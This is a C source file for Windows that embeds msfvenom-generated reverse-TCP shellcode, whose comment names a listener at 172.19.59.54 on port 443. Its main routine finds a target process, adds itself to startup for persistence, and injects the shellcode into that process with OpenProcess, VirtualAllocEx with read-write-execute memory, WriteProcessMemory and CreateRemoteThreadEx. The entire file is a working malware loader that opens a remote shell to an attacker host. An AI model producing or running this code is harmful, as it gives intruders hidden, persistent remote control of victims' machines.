﻿#include <stdio.h>
#include <windows.h>
#include "add_to_startup.h"
#include "find_pid.h"

const char* k = "[+]";
const char* i = "[+]";
const char* e = "[+]";

//msfvenom --platform windows --arch x64 EXITFUNC=thread -p windows/x64/shell/reverse_tcp_rc4 LHOST=172.19.59.54 LPORT=443 RC4PASSWORD=PASS EXITFUNC=thread -f c --var-name=ucReverseShell
unsigned char ucReverseShell[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6"
"\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x8f\x87\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x1f\x01\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x0f\x8e\x6d\x00\x00\x00\x48\x83\xc4\x20\x5e\x89\xf6\x81"
"\xf6\x5a\x51\xbc\x82\x4c\x8d\x9e\x00\x01\x00\x00\x6a\x40"
"\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31"
"\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x8d\x98\x00\x01"
"\x00\x00\x49\x89\xdf\x53\x56\x50\x4d\x31\xc9\x49\x89\xf0"
"\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5"
"\x48\x83\xc4\x20\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x20\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x75"
"\xb3\x49\x89\xfe\x5f\x59\x41\x59\x41\x56\xe8\x10\x00\x00"
"\x00\x5c\x4d\x2f\xf6\x7a\xe1\xd8\x35\xb1\x38\x60\x6b\x52"
"\x12\xc0\xe7\x5e\x48\x31\xc0\x49\x89\xf8\xaa\xfe\xc0\x75"
"\xfb\x48\x31\xdb\x41\x02\x1c\x00\x48\x89\xc2\x80\xe2\x0f"
"\x02\x1c\x16\x41\x8a\x14\x00\x41\x86\x14\x18\x41\x88\x14"
"\x00\xfe\xc0\x75\xe3\x48\x31\xdb\xfe\xc0\x41\x02\x1c\x00"
"\x41\x8a\x14\x00\x41\x86\x14\x18\x41\x88\x14\x00\x41\x02"
"\x14\x18\x41\x8a\x14\x10\x41\x30\x11\x49\xff\xc1\x48\xff"
"\xc9\x75\xdb\x5f\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
"\x2a\x0a\x41\x89\xda\xff\xd5";

DWORD PID,TID= NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;



int main(int arcg,char* argv[]) {

	LARGE_INTEGER StartingTime, EndingTime, ElapsedMicroseconds;
	LARGE_INTEGER Frequency;

	QueryPerformanceFrequency(&Frequency);
	QueryPerformanceCounter(&StartingTime);

	/*
	AddToStartup();
	
	if (arcg < 2) { printf("%s usage : rogram.exe <PID>", e); 
	return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	*/
	PID = get_pid();

	AddToStartup();

	printf("%s trying to open handle to process (%ld)\n", i, PID);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID);
	printf("%s got a handle to the process\n\\---0x%p\n",k,hProcess);

	if (hProcess == NULL) { printf("%s couldnt get a handle to process (%ld), error : %ld", e, PID, GetLastError());
	return EXIT_FAILURE;
	}

	rBuffer = VirtualAllocEx(hProcess,NULL,sizeof(ucReverseShell),(MEM_COMMIT | MEM_RESERVE),PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n",k,sizeof(ucReverseShell));

	
	WriteProcessMemory(hProcess,rBuffer,ucReverseShell,sizeof(ucReverseShell),NULL);
	printf("%s wrote %zu-bytes to process memory\n", k, sizeof(ucReverseShell));

	hThread = CreateRemoteThreadEx(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)rBuffer,NULL,0,0,&TID);

	if (hThread == NULL) {
	
		printf("%s faild to get a handle to the thread , error: %ld ", e,GetLastError());
		CloseHandle(hProcess);
		
		return EXIT_FAILURE;
	}




	QueryPerformanceCounter(&EndingTime);
	ElapsedMicroseconds.QuadPart = EndingTime.QuadPart - StartingTime.QuadPart;
	ElapsedMicroseconds.QuadPart *= 1000000;
	ElapsedMicroseconds.QuadPart /= Frequency.QuadPart;
	printf("%s got a handle to the thread (%ld), %lu micro Sec\n\\ ---0x%p\n ",k,TID,hThread,ElapsedMicroseconds);

	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished execution\n",k);

	printf("%s cleaning up\n",i);
	CloseHandle(hThread); 
	CloseHandle(hProcess);
	printf("%s finishd!\n", k);

	

	return EXIT_SUCCESS;

}